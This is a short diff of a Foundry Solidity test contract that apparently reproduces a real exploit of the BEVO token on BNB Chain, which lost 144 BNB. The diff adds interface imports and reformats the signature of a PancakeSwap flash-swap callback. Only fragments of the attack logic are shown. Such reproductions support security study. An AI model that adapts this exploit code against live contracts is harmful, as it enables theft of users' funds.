@@ -2,6 +2,9 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 
 // Total lost: 144 BNB
 // Frontrunner: https://bscscan.com/address/0xd3455773c44bf0809e2aeff140e029c632985c50
@@ -39,9 +42,15 @@ contract BEVOExploit is Test {
         emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
-        external
-    {
+    function pancakeCall(
+        address,
+        /*sender*/
+        uint256,
+        /*amount0*/
+        uint256,
+        /*amount1*/
+        bytes calldata /*data*/
+    ) external {
         address[] memory path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bevo);
